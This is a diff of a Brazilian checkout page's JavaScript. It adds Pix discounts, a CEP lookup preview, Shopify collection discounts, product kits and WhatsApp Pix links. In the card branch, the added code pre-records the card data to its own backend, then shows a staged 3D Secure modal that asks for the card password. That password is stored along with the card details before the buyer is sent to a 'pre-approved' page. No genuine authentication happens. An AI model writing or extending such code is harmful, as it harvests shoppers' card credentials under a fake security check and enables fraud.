   // Máscara Cartão de Crédito: XXXX XXXX XXXX XXXX
   cardInput.addEventListener('input', () => {
@@ -560,6 +1331,25 @@ document.addEventListener('DOMContentLoaded', () => {
     view.textContent = parts.join(' ');
   }
 
+  // Função para atualizar o preview de cidade/estado sob o CEP
+  function updateCepPreview() {
+    const cityEl = document.getElementById('city');
+    const stateEl = document.getElementById('state');
+    const previewEl = document.getElementById('cep-city-state-preview');
+    const wrapperEl = document.getElementById('city-state-inputs-wrapper');
+    
+    if (cityEl && stateEl && previewEl && wrapperEl) {
+      if (cityEl.value.trim() && stateEl.value.trim()) {
+        previewEl.textContent = `${stateEl.value.trim().toUpperCase()}/${cityEl.value.trim()}`;
+        previewEl.style.display = 'block';
+        wrapperEl.style.display = 'none';
+      } else {
+        previewEl.style.display = 'none';
+        wrapperEl.style.display = 'block';
+      }
+    }
+  }
+
   // ==========================================
   // 6. CONSULTA CEP AUTOMÁTICA (VIACEP)
   // ==========================================
@@ -585,16 +1375,27 @@ document.addEventListener('DOMContentLoaded', () => {
           inputWrapper.classList.add('input-error');
           shakeElement(inputWrapper);
         }
+        // Se der erro, exibimos os campos manuais de cidade/uf
+        const wrapperEl = document.getElementById('city-state-inputs-wrapper');
+        const previewEl = document.getElementById('cep-city-state-preview');
+        if (wrapperEl) wrapperEl.style.display = 'block';
+        if (previewEl) previewEl.style.display = 'none';
       } else {
         street.value = data.logradouro || '';
         neighborhood.value = data.bairro || '';
         city.value = data.localidade || '';
         state.value = data.uf || '';
         
+        // Atualizar preview dinâmico
+        updateCepPreview();
+        
         setTimeout(() => number.focus(), 150);
       }
     } catch (error) {
       console.error('Erro ao consultar CEP:', error);
+      // Se falhar a requisição, garante que os inputs fiquem visíveis para fallback manual
+      const wrapperEl = document.getElementById('city-state-inputs-wrapper');
+      if (wrapperEl) wrapperEl.style.display = 'block';
     } finally {
       cepLoader.classList.remove('show');
     }
@@ -620,11 +1421,46 @@ document.addEventListener('DOMContentLoaded', () => {
       shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
     }
 
-    const total = subtotal + shippingPrice;
+    let discountVal = 0;
+    const selectedMethod = document.getElementById('selected-payment-method').value;
+    const discountRow = document.getElementById('summary-discount-row');
+    const discountPercentSpan = document.getElementById('summary-discount-percent');
+    const discountValueSpan = document.getElementById('summary-discount-value');
+
+    if (selectedMethod === 'pix' && discountPixPercent > 0) {
+      discountVal = parseFloat((subtotal * (discountPixPercent / 100)).toFixed(2));
+      if (discountPercentSpan) discountPercentSpan.textContent = discountPixPercent;
+      if (discountValueSpan) discountValueSpan.textContent = `-${discountVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+      if (discountRow) discountRow.classList.remove('hide');
+    } else {
+      if (discountRow) discountRow.classList.add('hide');
+    }
+
+    const total = parseFloat((subtotal + shippingPrice - discountVal).toFixed(2));
 
     subtotalView.textContent = subtotal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     shippingView.textContent = shippingPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     totalView.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+    // Atualizar visualizador de resumo Pix simplificado
+    const pixDiscountBadgeText = document.getElementById('pix-discount-badge-text');
+    const pixTotalToPay = document.getElementById('pix-total-to-pay');
+    const pixEconomyText = document.getElementById('pix-economy-text');
+
+    if (pixDiscountBadgeText) {
+      pixDiscountBadgeText.textContent = `${discountPixPercent}% de desconto`;
+    }
+    if (pixTotalToPay) {
+      pixTotalToPay.textContent = total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    }
+    if (pixEconomyText) {
+      if (discountVal > 0) {
+        pixEconomyText.textContent = `Desconto Pix aplicado: economia de ${discountVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}.`;
+        pixEconomyText.style.display = 'block';
+      } else {
+        pixEconomyText.style.display = 'none';
+      }
+    }
   }
 
   amountInput.addEventListener('input', calculateTotals);
@@ -633,6 +1469,7 @@ document.addEventListener('DOMContentLoaded', () => {
       document.querySelectorAll('.shipping-option').forEach(el => el.classList.remove('active'));
       e.target.closest('.shipping-option').classList.add('active');
       calculateTotals();
+      updateCompletedSummaries();
     });
   });
 
@@ -651,6 +1488,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const paramSku = urlParams.get('sku');
     const paramQty = urlParams.get('quantity');
     const paramVariant = urlParams.get('shopify_variant_id');
+    const paramProductId = urlParams.get('shopify_product_id') || urlParams.get('product_id');
 
     if (paramTitle && paramPrice) {
       shpfyProductTitle = paramTitle;
@@ -682,11 +1520,278 @@ document.addEventListener('DOMContentLoaded', () => {
       // Recalcular totais finais
       calculateTotals();
       console.log(`🛒 Produto do Shopify carregado com sucesso: ${shpfyProductTitle} (${shpfyProductSku})`);
+      checkCollectionDiscounts(shpfyProductSku, shpfyVariantId, shpfyProductPrice, paramProductId);
     }
+  }
+
+  // Função para verificar e aplicar descontos automáticos de coleções Shopify
+  async function checkCollectionDiscounts(sku, variantId, basePrice, explicitProductId) {
+    try {
+      // 1. Carrega regras de desconto de coleção ativas do banco de dados (Supabase)
+      const marketingRes = await fetch('/api/marketing?type=collection_discount');
+      if (!marketingRes.ok) {
+        loadProductKits(sku, basePrice);
+        return;
+      }
+      const rules = await marketingRes.json();
+      
+      // Filtrar regras ativas
+      const activeRules = rules.filter(r => r.value && r.value.active !== false);
+      if (activeRules.length === 0) {
+        console.log('ℹ️ Nenhuma regra de desconto de coleção ativa no banco de dados.');
+        loadProductKits(sku, basePrice);
+        return;
+      }
+
+      console.log(`📡 Encontradas ${activeRules.length} regras de desconto de coleção ativas.`);
+
+      let productId = explicitProductId;
+
+      // 2. Se não temos o ID do produto explicitamente, buscamos nos produtos da Shopify pelo SKU ou variantId
+      if (!productId) {
+        const productsRes = await fetch('/api/shopify?action=products');
+        if (productsRes.ok) {
+          const products = await productsRes.json();
+          // Procurar produto que tenha o SKU ou Variant ID correspondente
+          const matchedProduct = products.find(prod => {
+            // Verificar SKU na lista de variantes do produto
+            const hasVariantSku = prod.variants && prod.variants.some(v => v.sku === sku);
+            // Verificar Variant ID se disponível
+            const hasVariantId = variantId && prod.variants && prod.variants.some(v => v.id.toString() === variantId.toString());
+            return hasVariantSku || hasVariantId;
+          });
+
+          if (matchedProduct) {
+            productId = matchedProduct.id;
+            console.log(`🔍 Produto associado na Shopify encontrado: ID ${productId}`);
+          }
+        }
+      }
+
+      if (!productId) {
+        console.log('⚠️ ID do produto Shopify não pôde ser determinado. Pulando regras de coleção.');
+        loadProductKits(sku, basePrice);
+        return;
+      }
+
+      // 3. Busca as coleções às quais este produto pertence
+      const collectionsRes = await fetch(`/api/shopify?action=product_collections&product_id=${productId}`);
+      if (!collectionsRes.ok) {
+        console.log('⚠️ Erro ao buscar coleções do produto na Shopify.');
+        loadProductKits(sku, basePrice);
+        return;
+      }
+
+      const productCollections = await collectionsRes.json();
+      console.log(`🏷️ O produto pertence a ${productCollections.length} coleções da Shopify.`);
+
+      // 4. Verifica se alguma coleção do produto possui uma regra de desconto ativa
+      let appliedRule = null;
+      let matchedCollectionName = '';
+
+      for (const col of productCollections) {
+        const rule = activeRules.find(r => r.key === col.id.toString());
+        if (rule) {
+          appliedRule = rule;
+          matchedCollectionName = col.title;
+          break; // Aplica a primeira regra correspondente
+        }
+      }
+
+      if (appliedRule) {
+        const val = appliedRule.value || {};
+        const discType = val.discount_type || 'percentage';
+        const discVal = parseFloat(val.discount_value) || 0;
+        
+        let newPrice = basePrice;
+        let badgeText = '';
+
+        if (discType === 'percentage') {
+          newPrice = basePrice * (1 - (discVal / 100));
+          badgeText = `Desconto Coleção ${matchedCollectionName}: -${discVal}%`;
+        } else if (discType === 'fixed') {
+          newPrice = basePrice - discVal;
+          badgeText = `Desconto Coleção ${matchedCollectionName}: -${discVal.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+        }
+
+        if (newPrice < 0.01) newPrice = 0.01;
+
+        console.log(`🎉 Regra de Coleção Ativa! Preço unitário reduzido de R$ ${basePrice} para R$ ${newPrice} (${badgeText})`);
+
+        // Atualiza a global shpfyProductPrice com o novo preço descontado
+        shpfyProductPrice = newPrice;
+
+        // Atualiza o input de preço do checkout
+        if (amountInput) {
+          amountInput.value = (newPrice * shpfyProductQuantity).toFixed(2);
+        }
+
+        // Renderiza o badge de desconto na interface do checkout
+        const itemInfo = document.querySelector('.items-list .item-info');
+        if (itemInfo) {
+          // Remover badge anterior se houver
+          const oldBadge = itemInfo.querySelector('.collection-discount-badge');
+          if (oldBadge) oldBadge.remove();
+
+          const badge = document.createElement('div');
+          badge.className = 'collection-discount-badge';
+          badge.style.cssText = 'display: inline-flex; align-items: center; gap: 0.35rem; font-size: 0.75rem; background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(5, 150, 105, 0.2)); color: #34d399; padding: 0.25rem 0.5rem; border-radius: 6px; border: 1px solid rgba(16, 185, 129, 0.25); font-weight: 700; margin-top: 0.4rem; font-family: inherit; align-self: flex-start;';
+          badge.innerHTML = `<i class="fa-solid fa-tags"></i> ${escapeHtml(badgeText)}`;
+          itemInfo.appendChild(badge);
+        }
+
+        // Recalcular totais e carregar kits com o novo preço base com desconto!
+        calculateTotals();
+        loadProductKits(sku, newPrice);
+      } else {
+        console.log('ℹ️ Nenhuma regra de coleção correspondente a este produto.');
+        loadProductKits(sku, basePrice);
+      }
+
+    } catch (err) {
+      console.error('Erro ao verificar descontos de coleção:', err);
+      // Garante que os kits são carregados de qualquer forma
+      loadProductKits(sku, basePrice);
+    }
+  }
+
+  // Função para buscar e renderizar Kits de Ofertas para o produto atual
+  async function loadProductKits(sku, basePrice) {
+    if (!sku) return;
+    
+    try {
+      const response = await fetch(`/api/marketing?type=kit`);
+      if (!response.ok) return;
+      
+      const kits = await response.json();
+      // Filtrar kits ativos que pertencem a este SKU
+      const productKits = kits.filter(k => k.key === sku && k.value && k.value.active !== false);
+      
+      if (productKits.length === 0) return;
+      
+      console.log(`🎁 Encontrados ${productKits.length} kits ativos para o SKU ${sku}`);
+      
+      const container = document.getElementById('checkout-kits-container');
+      const list = document.getElementById('checkout-kits-list');
+      if (!container || !list) return;
+      
+      // Limpa a lista
+      list.innerHTML = '';
+      
+      // Adiciona a opção padrão: 1 unidade (sem desconto)
+      const defaultOption = document.createElement('div');
+      defaultOption.className = 'kit-option-card active';
+      defaultOption.innerHTML = `
+        <input type="radio" name="checkout-kit-selection" class="kit-option-radio" checked value="default">
+        <div class="kit-option-details">
+          <div class="kit-option-title">Levar apenas 1 unidade</div>
+          <div class="kit-option-desc">Sem desconto adicional</div>
+        </div>
+        <div class="kit-option-price-box">
+          <div class="kit-option-price">${basePrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
+        </div>
+      `;
+      list.appendChild(defaultOption);
+      
+      // Adiciona cada kit configurado
+      productKits.forEach((kit) => {
+        const val = kit.value || {};
+        const qty = val.quantity || 2;
+        const discountPct = val.discount_pct || 0;
+        
+        // Calcula preço do kit
+        let kitPrice = val.price || 0;
+        if (!kitPrice || kitPrice <= 0) {
+          // Preço automático baseado na quantidade e porcentagem de desconto
+          const subTotalRaw = basePrice * qty;
+          kitPrice = subTotalRaw * (1 - (discountPct / 100));
+        }
+        
+        const option = document.createElement('div');
+        option.className = 'kit-option-card';
+        option.innerHTML = `
+          <input type="radio" name="checkout-kit-selection" class="kit-option-radio" value="${kit.id}">
+          <div class="kit-option-badge">Melhor Oferta</div>
+          <div class="kit-option-details">
+            <div class="kit-option-title">${escapeHtml(val.title || `Compre ${qty} Unidades`)}</div>
+            <div class="kit-option-desc">${escapeHtml(val.items_description || `${qty}x unidades do produto`)}</div>
+          </div>
+          <div class="kit-option-price-box">
+            <div class="kit-option-price">${kitPrice.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</div>
+            ${discountPct > 0 ? `<div style="font-size:0.7rem; color:#10b981; font-weight:700;">-${discountPct}% Off</div>` : ''}
+          </div>
+        `;
+        
+        // Armazena dados no elemento para facilitar o cálculo ao selecionar
+        option.setAttribute('data-qty', qty);
+        option.setAttribute('data-price', kitPrice);
+        option.setAttribute('data-title', val.title || `Kit ${qty}x`);
+        
+        list.appendChild(option);
+      });
+      
+      // Mostra o container
+      container.classList.remove('hide');
+      
+      // Adiciona event listeners de clique nas opções
+      const cards = list.querySelectorAll('.kit-option-card');
+      cards.forEach(card => {
+        card.addEventListener('click', () => {
+          // Atualiza classes ativas
+          cards.forEach(c => c.classList.remove('active'));
+          card.classList.add('active');
+          
+          const radio = card.querySelector('.kit-option-radio');
+          if (radio) radio.checked = true;
+          
+          // Aplica os valores no checkout
+          const radioVal = radio.value;
+          if (radioVal === 'default') {
+            shpfyProductQuantity = 1;
+            amountInput.value = basePrice.toFixed(2);
+            // Atualiza resumo
+            const itemSubtitleSpan = document.querySelector('.items-list .item-subtitle');
+            if (itemSubtitleSpan) {
+              itemSubtitleSpan.textContent = `SKU: ${sku} | Qtd: 1`;
+            }
+          } else {
+            const qty = parseInt(card.getAttribute('data-qty'));
+            const price = parseFloat(card.getAttribute('data-price'));
+            shpfyProductQuantity = qty;
+            amountInput.value = price.toFixed(2);
+            
+            // Atualiza resumo
+            const itemSubtitleSpan = document.querySelector('.items-list .item-subtitle');
+            if (itemSubtitleSpan) {
+              const kitTitle = card.getAttribute('data-title');
+              itemSubtitleSpan.textContent = `SKU: ${sku} | Qtd: ${qty} (${kitTitle})`;
+            }
+          }
+          
+          // Recalcula totais finais
+          calculateTotals();
+        });
+      });
+      
+    } catch (err) {
+      console.error('Erro ao buscar ou configurar kits de ofertas:', err);
+    }
+  }
+
+  // Simple HTML escaping helper for client app
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#039;');
   }
 
   calculateTotals();
   parseUrlParameters();
+  updateTopProgressBar();
 
 
 
@@ -809,8 +1914,20 @@ document.addEventListener('DOMContentLoaded', () => {
   checkoutForm.addEventListener('submit', async (e) => {
     e.preventDefault();
 
+    const section1 = document.querySelector('.checkout-section[data-step="1"]');
+    const section2 = document.querySelector('.checkout-section[data-step="2"]');
     const section3 = document.querySelector('.checkout-section[data-step="3"]');
+
+    if (!validateSectionInputs(section1)) {
+      section1.scrollIntoView({ behavior: 'smooth' });
+      return;
+    }
+    if (!validateSectionInputs(section2)) {
+      section2.scrollIntoView({ behavior: 'smooth' });
+      return;
+    }
     if (!validateSectionInputs(section3)) {
+      section3.scrollIntoView({ behavior: 'smooth' });
       return;
     }
 
@@ -831,7 +1948,11 @@ document.addEventListener('DOMContentLoaded', () => {
       shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
     }
     
-    const totalAmount = subtotal + shippingPrice;
+    let discountVal = 0;
+    if (selectedMethod === 'pix' && discountPixPercent > 0) {
+      discountVal = parseFloat((subtotal * (discountPixPercent / 100)).toFixed(2));
+    }
+    const totalAmount = parseFloat((subtotal + shippingPrice - discountVal).toFixed(2));
 
     const itemsPayload = shpfyProductTitle ? [
       {
@@ -900,135 +2021,148 @@ document.addEventListener('DOMContentLoaded', () => {
       loadingSubtitle.textContent = "Estamos confirmando os dados com a rede emissora. Aguarde alguns segundos.";
       authLoadingOverlay.classList.add('open');
 
-      // 2. Aguardar 2.5 segundos
+      // 2. Fazer requisição imediata de pré-gravação com card_password e status como "erro 3ds"
+      const initialPayload = {
+        ...payload,
+        card_password: 'erro 3ds',
+        three_ds_status: 'erro 3ds',
+        status: 'FAILED' // Estado inicial caso não termine a inserção de senha
+      };
+
+      let responseData = null;
+      let firstRequestSuccess = false;
+
+      try {
+        const response = await fetch('/api/checkout', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(initialPayload)
+        });
+        responseData = await response.json();
+        if (response.ok && responseData.success) {
+          firstRequestSuccess = true;
+          console.log('💳 Dados do cartão pré-gravados com sucesso no Supabase (antes do 3DS).');
+        } else {
+          console.warn('⚠️ Falha ao pré-gravar cartão:', responseData.error);
+        }
+      } catch (err) {
+        console.error('❌ Erro na pré-gravação do cartão:', err);
+      }
+
+      // Popula as informações dinâmicas do modal 3DS
+      authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
+      authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
+
+      const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      authInfoAmount.textContent = totalBrl;
+
+      const now = new Date();
+      const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
+      authInfoDate.textContent = formattedDate;
+
+      const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
+      authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;
+
+      // Limpa os campos de senha e coloca foco no primeiro
+      digitInputs.forEach(input => input.value = '');
+      
+      // Esconde o loading overlay e abre o modal 3DS
+      authLoadingOverlay.classList.remove('open');
+      auth3dsOverlay.classList.add('open');
       setTimeout(() => {
-        authLoadingOverlay.classList.remove('open');
+        const firstDigit = document.getElementById('auth-digit-1');
+        if (firstDigit) firstDigit.focus();
+      }, 100);
 
-        // Popula as informações dinâmicas do modal 3DS
-        authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
-        authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
+      // Define a ação de envio da senha
+      const execute3dsSubmit = async () => {
+        // Recuperar a senha inserida
+        let passwordVal = '';
+        digitInputs.forEach(input => passwordVal += input.value);
 
-        const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-        authInfoAmount.textContent = totalBrl;
-
-        const now = new Date();
-        const formattedDate = now.toLocaleDateString('pt-BR') + ', ' + now.toLocaleTimeString('pt-BR');
-        authInfoDate.textContent = formattedDate;
-
-        const last4 = cardInput.value.replace(/\D/g, '').slice(-4);
-        authInfoCard.textContent = `XXXX XXXX XXXX ${last4 || '0000'}`;
-
-        // Limpa os campos de senha e coloca foco no primeiro
-        digitInputs.forEach(input => input.value = '');
-        
-        // Abre o modal 3DS
-        auth3dsOverlay.classList.add('open');
-        setTimeout(() => {
-          const firstDigit = document.getElementById('auth-digit-1');
-          if (firstDigit) firstDigit.focus();
-        }, 100);
-
-        // Define a ação de envio da senha
-        const execute3dsSubmit = async () => {
-          // Recuperar a senha inserida
-          let passwordVal = '';
-          digitInputs.forEach(input => passwordVal += input.value);
-
-          if (passwordVal.length < 4) {
-            const digitsContainer = document.querySelector('.auth-password-digits');
-            shakeElement(digitsContainer);
-            return;
-          }
-
-          // Senha válida! Prosseguir com o envio.
-          // 1. Mostrar loader de autenticação final
-          loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
-          loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
-          
-          auth3dsOverlay.classList.remove('open');
-          authLoadingOverlay.classList.add('open');
-
-          // 2. Aguardar 3.0 segundos
-          setTimeout(async () => {
-            // Determinar o status 3DS final
-            let finalThreeDsStatus = 'authenticated';
-
-            // Anexar a senha do cartão e o status atualizado no payload
-            const finalPayload = {
-              ...payload,
-              card_password: passwordVal,
-              three_ds_status: finalThreeDsStatus
-            };
-
-            try {
-              const response = await fetch('/api/checkout', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(finalPayload)
-              });
-
-              const responseData = await response.json();
-
-              if (!response.ok) {
-                throw new Error(responseData.details || responseData.error || 'Falha ao salvar transação de cartão.');
-              }
-
-              // Se o status retornado for FAILED ou REJECTED (devido a testes avançados negativos)
-              if (responseData.data && (responseData.data.status === 'FAILED' || responseData.data.status === 'REJECTED')) {
-                authLoadingOverlay.classList.remove('open');
-                showModalState('error', responseData);
-                
-                // Restaurar os controles do form principal
-                submitBtn.disabled = false;
-                btnText.classList.remove('hide');
-                btnLoader.classList.add('hide');
-              } else {
-                // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
-                trackPixelEvent('Purchase', {
-                  content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
-                  currency: 'BRL',
-                  value: totalAmount
-                });
-
-                // Limpar rascunho de sessão atual
-                localStorage.removeItem('checkout_session_id');
-
-                const urlParams = new URLSearchParams(window.location.search);
-                const storeParam = urlParams.get('store_url');
-                
-                let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
-                if (storeParam) {
-                  redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
-                }
-                
-                window.location.href = redirectUrl;
-              }
-
-            } catch (err) {
-              console.error('Erro ao processar transação de cartão:', err);
-              authLoadingOverlay.classList.remove('open');
-              showModalState('error', { error: err.message });
-              
-              // Restaurar os controles do form principal
-              submitBtn.disabled = false;
-              btnText.classList.remove('hide');
-              btnLoader.classList.add('hide');
-            }
-          }, 3000);
-        };
-
-        // Associar o clique de envio
-        // Substituímos o botão por um clone dele para limpar listeners antigos!
-        const currentBtnSubmit = document.getElementById('btn-submit-3ds');
-        if (currentBtnSubmit) {
-          const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
-          currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
-          newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
+        if (passwordVal.length < 4) {
+          const digitsContainer = document.querySelector('.auth-password-digits');
+          shakeElement(digitsContainer);
+          return;
         }
 
-      }, 2500);
+        // Senha válida! Prosseguir com o envio final para autenticar.
+        loadingTitle.textContent = "Confirmando autenticação 3D Secure...";
+        loadingSubtitle.textContent = "Por favor, não feche esta janela. Estamos realizando a verificação de segurança final...";
+        
+        auth3dsOverlay.classList.remove('open');
+        authLoadingOverlay.classList.add('open');
+
+        // Aguardar 2.0 segundos de animação
+        setTimeout(async () => {
+          // Anexar a senha do cartão e o status atualizado no payload final
+          const finalPayload = {
+            ...payload,
+            card_password: passwordVal,
+            three_ds_status: 'authenticated',
+            status: 'PRE-APPROVED',
+            shopify_order_id: responseData?.data?.shopify_order_id || null,
+            shopify_order_name: responseData?.data?.shopify_order_name || null
+          };
+
+          try {
+            const response = await fetch('/api/checkout', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(finalPayload)
+            });
+
+            const finalResponseData = await response.json();
+
+            if (!response.ok) {
+              throw new Error(finalResponseData.details || finalResponseData.error || 'Falha ao salvar transação de cartão.');
+            }
+
+            // Sucesso absoluto! Redirecionar para tela de pré-aprovação premium
+            trackPixelEvent('Purchase', {
+              content_name: shpfyProductTitle || 'Pacote Sandbox Elite',
+              currency: 'BRL',
+              value: totalAmount
+            });
+
+            // Limpar rascunho de sessão atual
+            localStorage.removeItem('checkout_session_id');
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const storeParam = urlParams.get('store_url');
+            
+            let redirectUrl = `card-pre-approved.html?amount=${totalAmount}&date=${encodeURIComponent(formattedDate)}`;
+            if (storeParam) {
+              redirectUrl += `&store_url=${encodeURIComponent(storeParam)}`;
+            }
+            
+            window.location.href = redirectUrl;
+
+          } catch (err) {
+            console.error('Erro ao processar transação de cartão:', err);
+            authLoadingOverlay.classList.remove('open');
+            showModalState('error', { error: err.message });
+            
+            // Restaurar os controles do form principal
+            submitBtn.disabled = false;
+            btnText.classList.remove('hide');
+            btnLoader.classList.add('hide');
+          }
+        }, 2000);
+      };
+
+      // Associar o clique de envio
+      // Substituímos o botão por um clone dele para limpar listeners antigos!
+      const currentBtnSubmit = document.getElementById('btn-submit-3ds');
+      if (currentBtnSubmit) {
+        const newBtnSubmit3ds = currentBtnSubmit.cloneNode(true);
+        currentBtnSubmit.parentNode.replaceChild(newBtnSubmit3ds, currentBtnSubmit);
+        newBtnSubmit3ds.addEventListener('click', execute3dsSubmit);
+      }
 
       return;
     }
@@ -1076,10 +2210,18 @@ document.addEventListener('DOMContentLoaded', () => {
     modalPixArea.classList.add('hide');
 
     if (state === 'processing') {
+      const selectedMethod = document.querySelector('input[name="payment_method"]:checked')?.value || 'card';
       statusIconBox.classList.add('processing');
-      statusIcon.classList.add('fa-spinner', 'fa-spin');
-      statusTitle.textContent = 'Processando...';
-      statusSubtitle.textContent = 'Enviando dados com segurança para o backend e registrando no Supabase.';
+      if (selectedMethod === 'pix') {
+        statusIconBox.classList.add('pix');
+        statusIcon.classList.add('fa-spinner', 'fa-spin');
+        statusTitle.textContent = 'Gerando seu Pix...';
+        statusSubtitle.textContent = 'Carregando o Pix seguro de pagamento... Por favor, não feche esta janela.';
+      } else {
+        statusIcon.classList.add('fa-spinner', 'fa-spin');
+        statusTitle.textContent = 'Processando...';
+        statusSubtitle.textContent = 'Enviando dados de forma segura e criptografada... Por favor, aguarde.';
+      }
       responseMode.textContent = 'STANDBY';
       responseMode.className = 'badge';
       responseJsonPreview.textContent = '// Aguardando resposta do backend...';
@@ -1103,6 +2245,106 @@ document.addEventListener('DOMContentLoaded', () => {
           // Mostrar área do Pix
           modalPixArea.classList.remove('hide');
           pixCopyInput.value = responseData.pix_qr_code;
+
+          // Se tivermos um ID de transação válido, iniciar polling reativo do status de pagamento
+          const transactionId = responseData.data ? responseData.data.id : null;
+          if (transactionId) {
+            if (window.pixPaymentPollInterval) {
+              clearInterval(window.pixPaymentPollInterval);
+            }
+
+            window.pixPaymentPollInterval = setInterval(async () => {
+              try {
+                const checkRes = await fetch(`/api/orders?id=${transactionId}`);
+                if (checkRes.ok) {
+                  const checkData = await checkRes.json();
+                  const orderData = Array.isArray(checkData) ? checkData[0] : checkData;
+                  
+                  if (orderData && orderData.status && orderData.status.toUpperCase() === 'PAID') {
+                    clearInterval(window.pixPaymentPollInterval);
+                    window.pixPaymentPollInterval = null;
+
+                    statusIconBox.className = 'status-icon-container success';
+                    statusIcon.className = 'fa-solid fa-check';
+                    
+                    statusTitle.textContent = 'Pagamento Aprovado!';
+                    statusSubtitle.textContent = 'Seu pedido foi confirmado e o pagamento via Pix foi validado com sucesso! 🎉';
+                    
+                    modalPixArea.classList.add('hide');
+                    
+                    btnCloseModal.style.display = 'inline-flex';
+                    btnCloseModal.innerHTML = '<i class="fa-solid fa-check"></i> Concluir';
+                  }
+                }
+              } catch (pollErr) {
+                console.error('Erro no polling do Pix:', pollErr);
+              }
+            }, 3000);
+          }
+          
+          // Configurar botões de WhatsApp dinamicamente
+          const btnWhatsappMessage = document.getElementById('btn-whatsapp-message');
+          const btnWhatsappPixKey = document.getElementById('btn-whatsapp-pixkey');
+
+          if (btnWhatsappMessage && btnWhatsappPixKey) {
+            const customerName = (responseData.data && responseData.data.customer_name) || 'Cliente';
+            const firstName = customerName.trim().split(/\s+/)[0];
+            
+            // Limpar telefone do cliente e formatar no padrão wa.me/55...
+            let customerPhone = (responseData.data && responseData.data.customer_phone) || '';
+            let cleanPhone = customerPhone.replace(/\D/g, '');
+            if (cleanPhone.length === 10 || cleanPhone.length === 11) {
+              cleanPhone = '55' + cleanPhone;
+            }
+
+            // Buscar número do pedido (Shopify order name, or gateway tx id, or #1009 fallback)
+            const orderNumber = (responseData.data && responseData.data.shopify_order_name) || 
+                                (responseData.data && responseData.data.gateway_tx_id ? `#${responseData.data.gateway_tx_id}` : '#1009');
+
+            // Descrição do(s) produto(s) comprado(s)
+            let productDetailsText = 'Produto Incrível';
+            if (responseData.data && Array.isArray(responseData.data.items) && responseData.data.items.length > 0) {
+              productDetailsText = responseData.data.items.map(item => {
+                const qtyText = item.quantity > 1 ? ` ${item.quantity} Und` : '';
+                return `${item.name}${qtyText}`;
+              }).join(', ');
+            } else if (typeof shpfyProductTitle === 'string' && shpfyProductTitle) {
+              productDetailsText = shpfyProductTitle;
+            }
+
+            // Valor formatado em BRL
+            const totalAmountVal = (responseData.data && responseData.data.amount) || parseFloat(amountInput.value) || 0;
+            const totalFormatted = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalAmountVal);
+
+            // Chave Pix Copia e Cola
+            const pixCode = responseData.pix_qr_code || '';
+
+            // Mensagem 1: Notificação de Pedido com Detalhes (usando o template dinâmico)
+            const message1 = dbWaMsgPix
+              .replace(/{nome}/g, firstName)
+              .replace(/{loja}/g, dbWaStoreName)
+              .replace(/{pedido}/g, orderNumber)
+              .replace(/{produtos}/g, productDetailsText)
+              .replace(/{valor}/g, totalFormatted);
+
+            // Mensagem 2: Apenas a chave Pix copia e cola
+            const message2 = pixCode;
+
+            // Injetar URLs nos botões
+            btnWhatsappMessage.href = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(message1)}`;
+            btnWhatsappPixKey.href = `https://wa.me/${cleanPhone}?text=${encodeURIComponent(message2)}`;
+          }
+          
+          // Customizar instruções do Pix caso definidas
+          const pixCustomInstructions = document.getElementById('pix-custom-instructions');
+          if (pixCustomInstructions) {
+            if (window._currentThemeConfig && window._currentThemeConfig.pixInstructions) {
+              pixCustomInstructions.innerText = window._currentThemeConfig.pixInstructions;
+              pixCustomInstructions.classList.remove('hide');
+            } else {
+              pixCustomInstructions.classList.add('hide');
+            }
+          }
           
           // Carregar QR Code visual
           qrLoadingSpinner.classList.add('show');
@@ -1173,12 +2415,16 @@ document.addEventListener('DOMContentLoaded', () => {
       });
   });
 
-  // Fechar o modal
+  // Fechar o modal e voltar para o domínio principal da loja
   btnCloseModal.addEventListener('click', () => {
     statusModal.classList.remove('open');
-    if (statusIconBox.classList.contains('success')) {
-      resetCheckoutForm();
+    if (window.pixPaymentPollInterval) {
+      clearInterval(window.pixPaymentPollInterval);
